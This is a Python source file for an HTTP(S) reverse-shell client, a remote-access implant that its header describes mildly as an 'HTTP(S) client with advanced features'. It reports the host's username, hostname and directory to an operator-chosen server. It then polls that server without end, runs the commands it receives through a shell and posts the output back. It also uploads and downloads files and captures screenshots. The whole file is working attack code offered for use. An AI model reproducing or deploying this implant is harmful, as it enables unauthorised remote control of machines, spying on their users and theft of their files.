#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__      = 'Christophoros Petrou (game0ver)'
__version__     = '1.0'

import os
import re
import sys
import socket
import warnings
import subprocess
from base64 import (
    b64encode as benc,
    urlsafe_b64decode as bdec
)
try:
    from urllib import unquote
    from urlparse import urlparse
except ImportError:
    from urllib.parse import (
        unquote,
        urlparse
    )
from argparse import (
    SUPPRESS,
    ArgumentParser,
    ArgumentTypeError,
    RawTextHelpFormatter
)
from random import randint
from requests import Session
from requests.exceptions import *
warnings.filterwarnings("ignore")

special_commands = ["upload", "download"]
chg_dir = re.compile(r'^cd (.*)$')
unix_path = re.compile(r'^(.+/)*([^/]+)$')
wind_path = re.compile(r'^(.+\\)*([^/]+)$')
screenshot = re.compile(r'^screenshot\s*$')

CERT = None
SERVER = None

def console():
    parser = ArgumentParser(description="{}client.py:{} An HTTP(S) client with advanced features.".format('\033[1m', '\033[0m'),
                formatter_class=RawTextHelpFormatter)
    parser._optionals.title = "{}arguments{}".format('\033[1m', '\033[0m')
    parser.add_argument('-s', "--server",
                type=validateServer,
                default=None, required=False, metavar='',
                help="Specify an HTTP(S) server to connect to.")

    parser.add_argument('-c', "--cert",
                required=False, metavar='',
                help="Specify a certificate to use.")

    parser.add_argument('-p', "--proxy",
                type=validateProxy,
                default=None, required=False, metavar='',
                help="Specify a proxy to use [form: host:port]")

    args = parser.parse_args()
    return args


def validateServer(url):
    try:
        if not url.endswith('/'):
            res = urlparse(url+'/')
        else:
            res = urlparse(url)
        if all([res.scheme, res.netloc, res.path]):
            return url
        else:
            raise ArgumentTypeError('[x] The "--server" must be in the form: http(s)://(ip or domain):port')
    except Exception as error:
        raise error


def validatePort(port):
    if isinstance(int(port), int):
        if 1 < int(port) < 65536:
            return int(port)
        else:
            raise ArgumentTypeError('[x] Port must be in range 1-65535')
    else:
        raise ArgumentTypeError('Port must be in range 1-65535')


def validateIP(ip):
    try:
        if socket.inet_aton(ip):
            return ip
    except socket.error:
        raise ArgumentTypeError('[x] Invalid IP provided')


def validateProxy(proxy):
    if not ':' in proxy or proxy.count(':') != 1:
        raise ArgumentTypeError('[x] Proxy must be in the form: host:port')
    else:
        host, port = proxy.split(':')
        if validateIP(host) and validatePort(port):
            return proxy


def valid_file(filepath):
    try:
        if not os.path.isfile(filepath):
            return False
        return True if os.access(filepath, os.R_OK) else False
    except:
        return False


def current_dir(cwd):
    try:
        if os.name == "nt":
            cwd_name = '\\'+[x for x in cwd.split('\\') if x != ''][-1]
        else:
            cwd_name = '/'+[x for x in cwd.split('/') if x != ''][-1]
    except IndexError:
        cwd_name = '/'
    return cwd_name


def exec_cmd(cmd):
    cmd_output = subprocess.Popen(cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT)
    return cmd_output.communicate()


username, error = exec_cmd("whoami")
if os.name=='nt':
    username = username.decode('utf-8').split('\\')[1]
hostname, error = exec_cmd("hostname")
try:
    cwd = current_dir(os.getcwd())
except OSError:
    if os.name == 'nt':
        cwd = '\\'
    else:
        cwd = "/"

_headers = {
    "username" : username.strip(),
    "hostname" : hostname.strip(),
    "directory": cwd
}


try:
    args = console()
    if args.server:
        SERVER = args.server
    else:
        if not SERVER:
            print("An HTTP(S) server must be specified.")
            sys.exit(0)
    with Session() as s:
        if args.proxy:
            host, port = args.proxy.split(':')
            s.proxies = {"http":'{}:{}'.format(host,int(port)),
                         "https":'{}:{}'.format(host,int(port))}
        if args.cert:
            s.verify = args.cert
        elif CERT:
            with open('cert.pem', 'w') as w: w.write(CERT)
            s.verify = "cert.pem"
        else:
            s.verify = False

        while True:
            res = s.get(SERVER, headers=_headers)
            if any(command in res.url for command in special_commands):
                if 'upload' in res.url:
                    filename = res.url.split('/')[-1]
                    with open(filename, 'w') as w:
                        w.write(str(bdec(str(res.text))))
                    s.post(SERVER,
                        headers={
                                "Filename" : filename,
                                "Action"   : 'upload'
                            },
                        data='Upload Successful!')
                else:
                    filepath = bdec(str(unquote(res.url.split('/')[-1]))).decode("utf-8")
                    if valid_file(filepath):
                        with open(filepath, 'rb') as f:
                            file_contents = benc(f.read())
                        if unix_path.match(filepath):
                            file_name = unix_path.search(filepath).group(2)
                        else:
                            file_name = wind_path.search(filepath).group(2)
                        s.post(SERVER,
                            headers={
                                "Filename" : file_name,
                                "Action"   : 'download'
                            },
                            data=file_contents)
                    else:
                        s.post(SERVER, data='ERROR: File does not exist or is not readable!')
            else:
                cmd = res.text
                if cmd:
                    if cmd == "exit":
                        sys.exit(0)
                    if chg_dir.match(cmd):
                        try:
                            directory = chg_dir.search(cmd).group(1)
                            if os.name == "nt":
                                if not directory.endswith('\\'): directory += '\\'
                            else:
                                if not directory.endswith('/'): directory += '/'
                            os.chdir(directory)
                            _headers['directory'] =  current_dir(os.getcwd())
                        except OSError as dir_error:
                            s.post(SERVER, data=dir_error)
                    elif screenshot.match(cmd):
                        try:
                            from PIL import ImageGrab
                            screen_shot = ImageGrab.grab()
                            screenshot_name = "screenshot_{}.png".format(randint(0, 1000))
                            screen_shot.save(screenshot_name)
                            with open(screenshot_name,'rb') as f:
                                screenshot_data = f.read()
                            s.post(SERVER,
                                headers={
                                    "Filename" : screenshot_name,
                                    "Action"   : 'download'
                                },
                                data=benc(screenshot_data))
                            if os.name=='nt':
                                exec_cmd('del {}'.format(screenshot_name))
                            else:
                                exec_cmd('rm {}'.format(screenshot_name))
                        except ImportError:
                            s.post(SERVER, data='ERROR: Pillow module is not installed')
                        except Exception as screenshot_error:
                            s.post(SERVER, data=screenshot_error)
                    else:
                        try:
                            stdout, stderr = exec_cmd(cmd)
                            if stderr:
                                cmd_output = stderr
                            else:
                                cmd_output = stdout
                        except Exception as error:
                            cmd_output = error
                            continue
                        s.post(SERVER, data=cmd_output)
except KeyboardInterrupt:
    sys.exit(0)
except ConnectionError:
    sys.exit(0)
except TooManyRedirects:
    sys.exit(0)
except Exception as error:
    raise(error)